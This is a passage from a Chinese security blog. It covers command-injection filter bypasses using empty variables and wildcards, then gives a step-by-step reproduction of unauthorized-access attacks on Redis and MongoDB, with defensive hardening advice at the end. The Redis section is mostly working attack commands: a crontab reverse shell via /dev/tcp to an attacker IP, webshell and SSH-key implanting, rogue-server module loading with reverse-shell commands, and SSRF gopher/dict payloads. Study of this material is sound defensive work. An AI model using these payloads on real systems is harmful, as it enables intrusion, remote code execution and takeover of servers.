<h4 id="使用一个内容为空的变量名"><a href="#使用一个内容为空的变量名" class="headerlink" title="使用一个内容为空的变量名"></a>使用一个内容为空的变量名</h4><p>没有赋值的变量，在bash中都是为空。比如<br><img src="https://images.atsud0.me/images/post/Screenshot_20200805_111026.jpg" alt=""></p>
<p>所以就可以使用这样的方法来绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c$3at fl$&#123;fff&#125;ag.php</span><br></pre></td></tr></table></figure>

<p>为什么$fff要用{}来包裹?因为如果不用花括号对fff这个不存在的变量包裹的话，这个语句就会出错，包裹起来是为了告诉bash，变量的名字是fff不是fffag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c$3at fl$fffag.php</span><br><span class="line">cat: fl.php: No such file or directory</span><br></pre></td></tr></table></figure>

<p>特殊符号的!和@也$()有相同的效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c$!at fl$@ag.php</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c$()at fl$()ag.php</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>

<p>$* 也可以占位使用。</p>
<p>这一切都是基于这个变量名没有被使用。</p>
<p>如果该变量被使用了的会就会变成这个样子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca$&#123;x&#125;t fl$&#123;v&#125;ag.php</span><br><span class="line">!!flag</span><br><span class="line">x&#x3D;1</span><br><span class="line">ca$&#123;x&#125;t fl$&#123;v&#125;ag.php</span><br><span class="line">bash: ca1t: command not found</span><br></pre></td></tr></table></figure>

<h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] flag.php </span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>

<p>但是文件名被过滤的话，可以这样绕过.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;lag.php</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;ag.php</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;g.php</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;.php</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;php</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;hp</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;p</span><br></pre></td></tr></table></figure>

<p>但是如果有差不多相同(长度一样，后缀一样)的文件名的话，则会…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;error&#39;&gt;1234.php </span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;p</span><br><span class="line">error</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>

<p>所以还可以这样使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat [f][l][a][g]?php</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>

<p>关于linux下通配符可以看<a href="https://www.cnblogs.com/lixuwu/p/7816335.html" target="_blank" rel="noopener">Linux文件名匹配</a></p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Linux</tag>
        <tag>命令执行</tag>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title>未授权漏洞复现</title>
    <url>/2020/11/20/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>学习有关未授权漏洞,没写完））））</p>
<a id="more"></a>

<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>默认端口:<code>6379</code></p>
<ul>
<li>Windows下，绝对路径写webshell 、写入启动项。</li>
<li>Linux下，绝对路径写webshell 、公私钥认证获取root权限 、利用contrab计划任务反弹shell。</li>
</ul>
<p>可以直接<code>nc</code>进去，又或者是用<code>redis-cli</code>工具</p>
<p><img src="https://images.atsud0.me/images/post/image-20201120223754669.png" alt="image-20201120223754669"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info # 信息</span><br><span class="line">keys * # 查询所有键 （慎用，生产环境上直接执行，可能会出几百万条数据，导致炸了。）</span><br><span class="line">get key_name #获取键值</span><br><span class="line">set x 1# 设置 x为1</span><br><span class="line">config get dir # 获取当前目录</span><br><span class="line">config set dir &#x2F;root&#x2F;...# 设置目录</span><br><span class="line">config set dbfilename # 设置数据库文件名</span><br><span class="line">save # 保存</span><br><span class="line">flushall #删除所有数据</span><br><span class="line">del key #删除键为key的数据</span><br><span class="line">auth #认证</span><br></pre></td></tr></table></figure>



<h3 id="crontab-反弹shell"><a href="#crontab-反弹shell" class="headerlink" title="crontab 反弹shell"></a>crontab 反弹shell</h3><p>我只在Centos 6.10上测试了，其他系统未必可以。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.9.1&#x2F;1234 0&gt;&amp;1\n&quot; # 写反弹shell的内容</span><br><span class="line">+OK</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F; # cron的路径</span><br><span class="line">+OK</span><br><span class="line">config set dbfilename root # 设置保存的文件名为root</span><br><span class="line">+OK</span><br><span class="line">save </span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>

<p>等一会就来shell了。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201120224508469.png" alt="image-20201120224508469"></p>
<p>看下crontab的内容，怪不得要换行符呢。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201120224654602.png" alt="image-20201120224654602"></p>
<p>redis运行日志默认只有DB saved on disk的记录</p>
<p><img src="https://images.atsud0.me/images/post/image-20201120224903729.png" alt="image-20201120224903729"></p>
<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>写webshell和反弹crontab一样的，但是得符合以下条件：</p>
<ol>
<li>服务器具有web环境</li>
<li>你知道WEB服务的绝对路径</li>
<li>redis有在web目录的读写权限</li>
</ol>
<p>操作和反弹crontab几乎一样，在此不做过多介绍。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set x &quot;\n&lt;?php phpinfo()?&gt;\n&quot;</span><br><span class="line">+OK</span><br><span class="line">config set dir &#x2F;vhs&#x2F;kangle&#x2F;www</span><br><span class="line">+OK</span><br><span class="line">config set dbfilename x.php</span><br><span class="line">+OK</span><br><span class="line">save</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>

<h3 id="写入ssh-keygen公钥"><a href="#写入ssh-keygen公钥" class="headerlink" title="写入ssh-keygen公钥"></a>写入ssh-keygen公钥</h3><p>利用条件:</p>
<ol>
<li>ssh服务开放</li>
<li>目标服务器有被连入过（.ssh目录</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">-ERR Changing directory: No such file or directory</span><br><span class="line"># 这种情况就是没有ssh目录的</span><br><span class="line"></span><br><span class="line">如果是出现权限不足的错误提示，那就说明redis不是root用户运行的</span><br></pre></td></tr></table></figure>

<p>我懒，本机没有<code>redis-cli</code>客户端。所以继续用<code>nc</code>操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">+OK</span><br><span class="line">set x &quot;\n\n 你的id_rsa.pub公钥文件 \n\n&quot;</span><br><span class="line">+OK</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">+OK</span><br><span class="line">save</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>

<p>之后直接ssh。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201120231259159.png" alt="image-20201120231259159"></p>
<h3 id="eval-执行lua脚本"><a href="#eval-执行lua脚本" class="headerlink" title="eval 执行lua脚本"></a>eval 执行lua脚本</h3><p><code>Redis2.6</code>后的版本有内置<code>lua</code>环境可以导致lua脚本</p>
<p><strong>注意是2.6之后的版本</strong>，freebuf上有篇文章写了是Redis2.6以前的版本，结果我跑去下了个Redis 2.4直接就给我提示<code>ERR unknown command &#39;EVAL&#39;</code>。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">cat hello2.lua</span><br><span class="line"><span class="keyword">local</span> msg = <span class="string">"hello,hack!"</span></span><br><span class="line"><span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli eval &quot;$(cat hello2.lua)&quot; 0 -h 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201121084131135.png" alt="image-20201121084131135"></p>
<p>但是执行不了系统命令</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"whoami"</span>)</span><br><span class="line"><span class="keyword">local</span> t = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="keyword">local</span> a = t:<span class="built_in">read</span>(<span class="string">"*all"</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201121084435019.png" alt="image-20201121084435019"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201121084444962.png" alt="image-20201121084444962"></p>
<p>因为 Redis 不允许脚本使用 os 等一部分全局变量。</p>
<h3 id="4-unacc-主从复制"><a href="#4-unacc-主从复制" class="headerlink" title="4-unacc 主从复制"></a>4-unacc 主从复制</h3><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p>
<p>下载<code>vulhub</code>后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub&#x2F;redis&#x2F;4-unacc&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h4 id="自动化攻击"><a href="#自动化攻击" class="headerlink" title="自动化攻击"></a>自动化攻击</h4><p>1、生成恶意.so文件，下载<code>RedisModules-ExecuteCommand使用make</code>编译即可生成。</p>
<p>2.攻击端执行： python3 redis-master.py -r vul-ip -p 6379 -L hacker-ip -f RedisModulesSDK/exp.so</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;redis-rogue-server</span><br><span class="line">cd redis-rogue-server&#x2F;RedisModules-ExecuteCommand&#x2F;</span><br><span class="line">make</span><br><span class="line">cd ..</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">python3 redis-master.py -r 172.20.0.2 -p 6379 -L 172.20.0.1 -P 1233 -f RedisModulesSDK&#x2F;exp.so  -c &quot;id&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201121000741156.png" alt="image-20201121000741156"></p>
<h4 id="手动复现过程"><a href="#手动复现过程" class="headerlink" title="手动复现过程"></a>手动复现过程</h4><p>构造恶意Redis服务器，监听本地端口1233，加载exp.so。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python rogue-server.py --lport 1233 --exp redis-rogue-getshell&#x2F;RedisModulesSDK&#x2F;exp.so</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201121001814594.png" alt="image-20201121001814594"></p>
<p>通过未授权连接到存在漏洞的redis服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#设置redis的备份路径为当前目录</span><br><span class="line">    config set dir .&#x2F;</span><br><span class="line">#设置备份文件名为exp.so，默认为dump.rdb</span><br><span class="line">    config set dbfilename exp.so</span><br><span class="line">#设置主服务器IP和端口</span><br><span class="line">    slaveof 172.20.0.1 1233</span><br><span class="line">#加载恶意模块</span><br><span class="line">    module load .&#x2F;exp.so</span><br><span class="line">#切断主从，关闭复制功能</span><br><span class="line">    slaveof no one </span><br><span class="line">#执行系统命令</span><br><span class="line">    system.exec &#39;whoami&#39;</span><br><span class="line">    system.rev 172.20.0.1 1230    </span><br><span class="line">#通过dump.rdb文件恢复数据</span><br><span class="line">    config set dbfilename dump.rdb</span><br><span class="line">#删除exp.so</span><br><span class="line">    system.exec &#39;rm .&#x2F;exp.so&#39;</span><br><span class="line">#卸载system模块的加载</span><br><span class="line">    module unload system</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201121001923422.png" alt="image-20201121001923422"></p>
<h5 id="ssrf-getshell"><a href="#ssrf-getshell" class="headerlink" title="ssrf getshell"></a>ssrf getshell</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 因为服务器没有web环境，在大佬的脚本上做了些许改动。</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line">$url=$argv[<span class="number">1</span>];</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看当前redis的相关配置</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;info</span><br><span class="line"></span><br><span class="line">#设置备份文件名</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;config:set:dbfilename:exp.so</span><br><span class="line"></span><br><span class="line">#连接恶意Redis服务器</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;slaveof:192.168.172.129:1234</span><br><span class="line"></span><br><span class="line">#加载恶意模块</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;module:load:.&#x2F;exp.so</span><br><span class="line"></span><br><span class="line">#切断主从复制</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;slaveof:no:one</span><br><span class="line"></span><br><span class="line">#执行系统命令</span><br><span class="line"> ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.172.131:6379&#x2F;system.rev:192.168.172.129:9999</span><br></pre></td></tr></table></figure>



<h5 id="gopher-getshell"><a href="#gopher-getshell" class="headerlink" title="gopher getshell"></a>gopher getshell</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#设置文件名，连接恶意Redis服务器</span><br><span class="line">gopher:&#x2F;&#x2F;192.168.172.131:6379&#x2F;_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.172.129%25201234%250d%250aquit</span><br><span class="line"></span><br><span class="line">#加载exp.so，反弹shell</span><br><span class="line">gopher:&#x2F;&#x2F;192.168.172.131:6379&#x2F;_module%2520load%2520.&#x2F;exp.so%250d%250asystem.rev%2520192.168.172.129%25209999%250d%250aquit</span><br></pre></td></tr></table></figure>



<p><img src="https://images.atsud0.me/images/post/image-20201121002930152.png" alt="image-20201121002930152"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201121002917272.png" alt="image-20201121002917272"></p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol>
<li><p>防火墙或配置文件限制访问：配置文件新增:<code>bind 127.0.0.1</code></p>
</li>
<li><p>设置密码： <code>redis.conf</code>添加<code>requirepass mypasswd</code> # 不建议使用<code>redis-cli -a</code> 明文登陆</p>
<p>设置密码后不能直接访问。<img src="https://images.atsud0.me/images/post/image-20201120232144128.png" alt="image-20201120232144128"></p>
</li>
<li><p>低权限运行 Redis 服务，为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置<code>redis.conf</code>文件开启日志记录，禁用/修改高危命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">logfile&quot;&#x2F;var&#x2F;log&#x2F;redis&#x2F;redis.log&quot;</span><br><span class="line">loglevel verbose</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>结合上面的工作，最后再修改默认端口。</p>
</li>
</ol>
<h3 id="本节参考链接"><a href="#本节参考链接" class="headerlink" title="本节参考链接"></a>本节参考链接</h3><ul>
<li><a href="https://www.cnblogs.com/xiaozi/p/13089906.html" target="_blank" rel="noopener">Redis主从复制getshell技巧</a></li>
<li><a href="https://www.freebuf.com/vuls/254160.html" target="_blank" rel="noopener">未授权漏洞学习</a></li>
<li><a href="https://my.oschina.net/coderknock/blog/968487" target="_blank" rel="noopener">Redis Lua 脚本使用</a></li>
</ul>
<h2 id="Mongo"><a href="#Mongo" class="headerlink" title="Mongo"></a>Mongo</h2><p>默认端口：</p>
<ul>
<li><code>27017</code>mongod默认的端口</li>
<li><code>27018</code> 设置 <em>–shardsvr</em> 运行变量或在配置文件里设置 <a href="https://mongoing.com/docs/reference/configuration-options.html#sharding.clusterRole" target="_blank" rel="noopener"><code>clusterRole</code></a> 为 <code>shardsvr</code> 时的默认端口</li>
<li><code>27019</code>设置 <em>–configsvr</em> 运行变量或在配置文件中将 <a href="https://mongoing.com/docs/reference/configuration-options.html#sharding.clusterRole" target="_blank" rel="noopener"><code>clusterRole</code></a> 设置为 <code>configsvr</code> 时的默认端口</li>
<li><code>28017</code>系统状态网页的默认端口。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull mongo</span><br><span class="line">docker run -d -p 27017:27017 --name mongodb mongo</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show dbs；#列出有哪些数据库，数据库占用了多大的存储空间。</span><br><span class="line">db；#当前连接的是哪个数据库</span><br></pre></td></tr></table></figure>

<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>直接上msf好了。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201121090914555.png" alt="image-20201121090914555"></p>
<blockquote>
<p>doesn’t use authentication 就是存在未授权访问</p>
</blockquote>
<h3 id="其他探测工具"><a href="#其他探测工具" class="headerlink" title="其他探测工具"></a>其他探测工具</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 27017 --script&#x3D;mongodb-brute.nse -sV 10.170.0.3</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201121091600632.png" alt="image-20201121091600632"></p>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><blockquote>
<p>网上流传的各类Python检测脚本，主要检测方式是以下两种：</p>
<p> 1.一种检测方式是使用Python的PyMongo库，不使用账号密码连接MongoDB服务，连接成功则证明存在未授权访问漏洞。由于PyMongo库只支持MongoDB 2.6及之后版本，低版本MongoDB存在漏洞时无法发现。</p>
<p>2.另一种检测方式是使用socket与MongoDB服务端口建立连接后发送数据库查询指令，返回的数据中，存在默认库<code>local</code>，则表示数据库查询成功，存在未授权访问漏洞。在1.9版本的MongoDB服务中，报错信息中包含local字符，引起误报。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 脚本代码来自:https://www.freebuf.com/vuls/212799.html</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mongodb</span><span class="params">(self, ip)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="number">27017</span>))        s.send(<span class="string">'\x3F\x00\x00\x00\x7E\x00\x00\x00\x00\x00\x00\x00\xD4\x07\x00\x00\x04\x00\x00\x00\x61\x64\x6D\x69\x6E\x2E\x24\x63\x6D\x64\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x18\x00\x00\x00\x10\x6C\x69\x73\x74\x44\x61\x74\x61\x62\x61\x73\x65\x73\x00\x01\x00\x00\x00\x00'</span>)</span><br><span class="line">        result = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'local'</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">'errmsg'</span> <span class="keyword">not</span> <span class="keyword">in</span> result:  <span class="comment">#增加一个“errmsg”字符串判断，避免1.9版本中的误报。</span></span><br><span class="line">            print(<span class="string">u'&#123;&#125;[+] &#123;&#125;:27017\tMongoDB存在未授权访问&#123;&#125;'</span>.format(G, ip, W))</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'weakpass.txt'</span>, <span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">'&#123;&#125;\t27017\tMongoDB存在未授权访问\n'</span>.format(ip,))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mongodb_check(<span class="string">"192.168.1.10"</span>,<span class="string">"27017"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h4 id="本地监听"><a href="#本地监听" class="headerlink" title="本地监听"></a>本地监听</h4><p>只在本地使用的话，只监听本地，使用<code>--bind_ip 127.0.0.1</code>绑定监听地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mongod --bind_ip 127.0.0.1 --dbpath &#x2F;tmp&#x2F;test</span><br></pre></td></tr></table></figure>

<p>配置文件修改 <code>/etc/mongod.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># network interfaces</span><br><span class="line">net:</span><br><span class="line">  port: 27017</span><br><span class="line">  bindIp: 127.0.0.1</span><br></pre></td></tr></table></figure>

<h4 id="防火墙限制访问源"><a href="#防火墙限制访问源" class="headerlink" title="防火墙限制访问源"></a>防火墙限制访问源</h4><p>使用<code>iptables</code>/<code>firewalld</code>什么的控制访问源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s &lt;ip-address&gt; -p tcp --destination-port 27017 -m state --state NEW,ESTABLISHED -j ACCEPT <span class="comment"># 入站</span></span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -d &lt;ip-address&gt; -p tcp --<span class="built_in">source</span>-port 27017 -m state --state ESTABLISHED -j ACCEPT <span class="comment"># 出站</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --add-rich-rule&#x3D;&quot;rule family&#x3D;&quot;ipv4&quot; source address&#x3D;&quot;&lt;ip-address&gt;&quot; port protocol&#x3D;&quot;tcp&quot; port&#x3D;&quot;27017&quot; accept&quot;</span><br><span class="line"></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">firewall-cmd --list-rich-rule</span><br><span class="line"></span><br><span class="line">如果要指定对应区域的话，再加个--zone&#x3D;Public</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 删除规则</span><br><span class="line">firewall-cmd --permanent --remove-rich-rule&#x3D;&quot;rule family&#x3D;&quot;ipv4&quot; source address&#x3D;&quot;&lt;ip-address&gt;&quot; port protocol&#x3D;&quot;tcp&quot; port&#x3D;&quot;27017&quot; accept&quot;</span><br><span class="line"></span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<h4 id="设置认证"><a href="#设置认证" class="headerlink" title="设置认证"></a>设置认证</h4><blockquote>
<p>MongoDB 3.0及以上版本启动时添加<code>--auth</code>参数开启认证访问，此时若数据库中无账号，本地登录则无权限进行任何操作，因此需要先以无认证的方式启动服务并创建系统用户管理员账号。</p>
</blockquote>
<ol>
<li><p><strong>以无访问认证的方式启动MongoDB</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mongod --dbpath /data/db</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>未开启认证的环境下，登录到数据库</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mongo --host 127.0.0.1 --port 27017</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>创建系统用户管理员</strong></p>
<p>创建一个用户名为<code>myUserAdmin</code>，密码为<code>Passw0rd</code>的系统用户管理员账号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#切换到admin库：</span><br><span class="line">&gt; use admin</span><br><span class="line">switched to db admin</span><br><span class="line"></span><br><span class="line">#创建用户</span><br><span class="line">&gt; db.createUser(</span><br><span class="line">  &#123;</span><br><span class="line">    user: &quot;myUserAdmin&quot;,</span><br><span class="line">    pwd: &quot;Passw0rd&quot;,</span><br><span class="line">    roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125; ]</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">#创建成功后提示信息：</span><br><span class="line">Successfully added user: &#123;</span><br><span class="line">    &quot;user&quot; : &quot;myUserAdmin&quot;,</span><br><span class="line">    &quot;roles&quot; : [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;role&quot; : &quot;userAdminAnyDatabase&quot;,</span><br><span class="line">            &quot;db&quot; : &quot;admin&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 说明：3.0之前版本使用db.addUser方法创建用户。 </p>
</blockquote>
</li>
<li><p><strong>重启MongoDB服务，开启访问认证</strong></p>
<p>启动时添加<code>--auth</code>参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mongod --auth --port 27017 --dbpath /tmp/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p> 或：在配置文件中添加以下内容，指定配置文件启动服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#security:</span><br><span class="line">security:</span><br><span class="line">  authorization: enabled</span><br></pre></td></tr></table></figure>

<p> 指定配置文件启动MongoDB</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mongod --config /etc/mongod.conf</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用系统用户管理员账号登录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mongo --port 27017 -u <span class="string">"myUserAdmin"</span> -p <span class="string">"Passw0rd"</span> --authenticationDatabase <span class="string">"admin"</span></span><br></pre></td></tr></table></figure>

<p>不明文的方式，先连接数据库，在用db.auth进行认证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; use admin</span><br><span class="line">switched to db admin</span><br><span class="line">&gt; db.auth(&quot;myUserAdmin&quot;,&quot;Passw0rd&quot;)</span><br><span class="line">1  #返回1，表示认证成功</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>创建数据库用户</strong>创建完系统用户管理员账号并通过系统用户管理员登陆后，对每个库创建指定的用户。下面以对products库创建一个具有读写权限的用户accountUser为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; use products</span><br><span class="line">&gt; db.createUser(</span><br><span class="line">   &#123;</span><br><span class="line">     user: &quot;accountUser&quot;,</span><br><span class="line">     pwd: &quot;password&quot;,</span><br><span class="line">     roles: [ &quot;readWrite&quot;, &quot;dbAdmin&quot; ]</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">#用户创建成功</span><br><span class="line">Successfully added user: &#123; &quot;user&quot; : &quot;accountUser&quot;, &quot;roles&quot; : [ &quot;readWrite&quot;, &quot;dbAdmin&quot; ] &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用数据库用户访问指定库</p>
